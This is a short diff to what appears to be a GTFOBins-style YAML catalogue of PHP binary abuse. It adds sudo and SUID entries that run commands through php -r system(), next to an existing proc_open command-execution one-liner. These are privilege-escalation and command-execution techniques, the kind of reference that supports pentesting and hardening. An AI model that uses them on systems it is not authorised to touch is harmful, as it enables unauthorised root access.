@@ -19,6 +19,14 @@ functions:
     - code: |
         export CMD="ls /"
         php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open(getenv("CMD"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
+  sudo-enabled:
+    - code: |
+        CMD="id"
+        sudo php -r "system('$CMD');"
+  suid-enabled:
+    - code: |
+        CMD="id"
+        ./php -r "system('$CMD');"
   upload:
     - description: Serve files in the local folder running an HTTP server.
       code: |
